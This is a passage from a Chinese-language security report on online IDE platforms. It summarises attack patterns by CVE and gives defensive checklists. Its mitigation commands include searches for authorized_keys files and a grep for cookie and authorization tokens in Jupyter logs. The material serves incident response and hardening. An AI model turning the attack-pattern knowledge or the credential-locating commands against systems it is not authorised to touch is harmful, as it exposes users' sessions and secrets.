| Jupyter Server GHSA-q874-g24w-4q9g | https://github.com/advisories/GHSA-q874-g24w-4q9g |
| Jupyter Notebook GHSA-m87f-39q9-6f55 | https://github.com/advisories/GHSA-m87f-39q9-6f55 |
| Eclipse Theia GHSA-gcm9-cc3r-c6vj | https://github.com/advisories/GHSA-gcm9-cc3r-c6vj |
| VS Code CVE-2026-47281 | https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-47281 |
| Guacamole Security Reports | https://guacamole.apache.org/security/ |
| Theia RCE Writeup (Google VRP) | https://omespino.com/write-up-google-bug-bounty-xss-to-cloud-shell-instance-takeover-rce-as-root-5000-usd/ |
| Jupyter Token Leak Writeup | https://blog.xss.am/2023/08/cve-2023-39968-jupyter-token-leak/ |

---

## 0x08 共性攻击模式分析

### 模式 1：认证绕过与会话劫持

在线 IDE 平台的认证机制是安全的第一道防线，也是最常被攻击的目标。共性问题包括：

- **默认无认证**：ttyd、部分 code-server 部署默认不启用认证
- **Token/Session 泄露**：CVE-2022-29241（PID 暴力破解）、CVE-2022-24758（日志泄露）
- **路径穿越绕过**：CVE-2024-22421（clone 参数路径穿越配合开放重定向）
- **会话固定**：部分平台在登录前后使用相同的 session ID

**防御策略**：强制启用认证、使用短过期时间的 token、实施 CSRF 防护、日志中脱敏敏感信息。

### 模式 2：沙箱逃逸与容器突破

远程开发环境的隔离机制是防止横向移动的关键：

- **Workspace Trust 绕过**：CVE-2026-47281 绕过 VS Code 的信任机制
- **容器权限过高**：以 root 运行的 workspace 容器
- **命名空间共享**：`--privileged` 或 `--pid=host` 等危险 Docker 配置
- **网络隔离不足**：workspace 之间可以互相通信

**防御策略**：使用最小权限原则配置容器、禁用 `--privileged` 模式、启用 seccomp/AppArmor、实施网络策略。

### 模式 3：命令注入与代码执行

这是在线 IDE 中最直接的攻击模式：

- **终端命令注入**：CVE-2021-34182（ttyd 默认配置 RCE）
- **一键代码执行**：CVE-2026-42557（JupyterLab CommandLinker）
- **Markdown 预览 RCE**：CVE-2020-27224（Theia XSS to RCE）
- **终端模拟器注入**：CVE-2023-29194（Guacamole console code 注入）

**防御策略**：输入验证与输出编码、使用 CSP 限制脚本执行、DOM 净化、终端输出过滤。

### 模式 4：路径穿越与文件访问

在线 IDE 的文件系统访问是核心功能，也容易成为攻击向量：

- **API 路径穿越**：CVE-2024-22421（JupyterLab clone 参数）
- **文件系统越权读写**：通过 API 端点访问宿主机文件
- **符号链接攻击**：利用 symlink 读取 workspace 外的文件

**防御策略**：规范化文件路径、限制文件系统访问范围、禁止跟随符号链接到 workspace 外。

### 模式 5：供应链攻击（恶意扩展/插件）

在线 IDE 的扩展生态是新兴的攻击面：

- **恶意 VS Code 扩展**：在扩展中嵌入后门代码，通过 Marketplace 传播
- **恶意 JupyterLab 扩展**：CVE-2026-42266 中 PyPI Extension Manager 白名单未正确执行
- **恶意 Notebook 文件**：通过 .ipynb 文件中的 HTML output 触发 XSS/RCE
- **恶意 Docker 镜像**：在预构建镜像中植入后门

**防御策略**：扩展白名单管理、验证扩展签名、审计 Notebook 文件来源、使用可信基础镜像。

---

## 0x09 应急排查与防守建议

### 紧急排查清单

针对在线 IDE 平台的紧急安全排查应覆盖以下项目：

| 排查项 | 检查方法 | 优先级 |
|---|---|---|
| ttyd 暴露 | 检查 7681 端口是否绑定到公网 | P0 |
| Jupyter 版本 | `jupyter --version` 检查是否低于安全版本 | P0 |
| code-server 认证 | 检查 `--auth` 参数和 config.yaml | P0 |
| VS Code 版本 | Help > About 检查是否 < 1.123.2 | P1 |
| Guacamole 版本 | 检查部署版本是否 < 1.5.0 | P1 |
| Theia 版本 | 检查 @theia/preview 是否 < 1.2.0 | P1 |
| 日志文件权限 | 检查 Jupyter 日志文件权限是否为 644 | P1 |
| 反向代理配置 | 检查 Nginx/Caddy 配置是否正确传递认证头 | P2 |
| 容器安全 | 检查 workspace 容器是否以 root 运行 | P2 |
| 扩展审计 | 审计已安装的 VS Code/Jupyter 扩展 | P2 |

### 日志关键字段表

在安全事件响应中，以下日志字段是关键证据来源：

| 平台 | 日志位置 | 关键字段 |
|---|---|---|
| Jupyter Server | `~/.local/share/jupyter/runtime/` | `Cookie`、`Authorization`、`X-Forwarded-For` |
| code-server | `~/.local/share/code-server/` | Session ID、登录 IP |
| VS Code Server | `~/.vscode-server/` | 连接来源 IP、workspace 路径 |
| ttyd | stdout / syslog | WebSocket 连接来源、命令执行记录 |
| Guacamole | guacd 日志 | 连接协议、目标地址、session 持续时间 |
| Nginx (反向代理) | `/var/log/nginx/access.log` | URI、User-Agent、Referer、来源 IP |

### 紧急缓解措施

**如果发现正在被利用**：

1. **立即隔离**：断开受影响 IDE 实例的网络访问
2. **终止会话**：Kill 所有活跃的 IDE 会话和进程
3. **轮换凭据**：更改所有相关的 token、密码和 API key
4. **保留证据**：导出日志文件和内存快照用于取证分析
5. **检查持久化**：检查 `.bashrc`、`.ssh/authorized_keys`、定时任务等是否被修改

**快速缓解命令**：

```bash
# 1. 通过 iptables 立即阻断外部访问
iptables -A INPUT -p tcp --dport 8888 -j DROP  # Jupyter
iptables -A INPUT -p tcp --dport 8080 -j DROP  # code-server
iptables -A INPUT -p tcp --dport 7681 -j DROP  # ttyd

# 2. 检查 SSH 后门
find / -name "authorized_keys" -exec ls -la {} \;
crontab -l
ls -la /etc/cron.*

# 3. 检查 Jupyter 日志中的敏感信息泄露
grep -r "Cookie\|_xsrf\|Authorization" /var/log/jupyter/

# 4. 检查 VS Code Server 进程
ps aux | grep code-server
netstat -tlnp | grep 8080
```

### 长期安全加固建议

1. **网络架构**：将在线 IDE 部署在独立网段，使用 VPN 或零信任方案限制访问
2. **认证加固**：强制启用 MFA、使用 SSO 集成、实施 RBAC
3. **版本管理**：建立自动化的依赖更新和安全补丁流程
4. **容器安全**：使用 Pod Security Standards、启用 seccomp、限制资源配额
5. **监控告警**：部署 WAF、配置异常登录告警、监控 API 异常访问
6. **安全开发生命周期**：将安全审计纳入 CI/CD 流程

---

## 0x0A 参考资料

1. **NVD - CVE-2021-34182 (ttyd)**: https://nvd.nist.gov/vuln/detail/CVE-2021-34182
2. **NVD - CVE-2026-42557 (JupyterLab)**: https://nvd.nist.gov/vuln/detail/CVE-2026-42557
3. **MSRC - CVE-2026-47281 (VS Code)**: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-47281
4. **GitHub Advisory - CVE-2020-27224 (Eclipse Theia)**: https://github.com/advisories/GHSA-gcm9-cc3r-c6vj
5. **GitHub Advisory - CVE-2022-29241 (Jupyter Server)**: https://github.com/advisories/GHSA-q874-g24w-4q9g
6. **GitHub Advisory - CVE-2024-22421 (JupyterLab)**: https://github.com/jupyterlab/jupyterlab/security/advisories/GHSA-44cc-43rp-5947
7. **GitHub Advisory - CVE-2022-24758 (Jupyter Notebook)**: https://github.com/jupyter/notebook/security/advisories/GHSA-m87f-39q9-6f55
8. **Apache Guacamole Security Reports**: https://guacamole.apache.org/security/
9. **JupyterLab v4.5.7 Security Release**: https://discourse.jupyter.org/t/security-releases-jupyterlab-v4-5-7-and-notebook-v7-5-6/38532
10. **VS Code Workspace Trust Bypass Analysis**: https://windowsnews.ai/article/vs-code-flaw-cve-2026-47281-bypasses-workspace-trustupdate-to-11232-immediately.436606
11. **Google VRP - XSS to Cloud Shell RCE**: https://omespino.com/write-up-google-bug-bounty-xss-to-cloud-shell-instance-takeover-rce-as-root-5000-usd/
12. **Jupyter Token Leak Writeup**: https://blog.xss.am/2023/08/cve-2023-39968-jupyter-token-leak/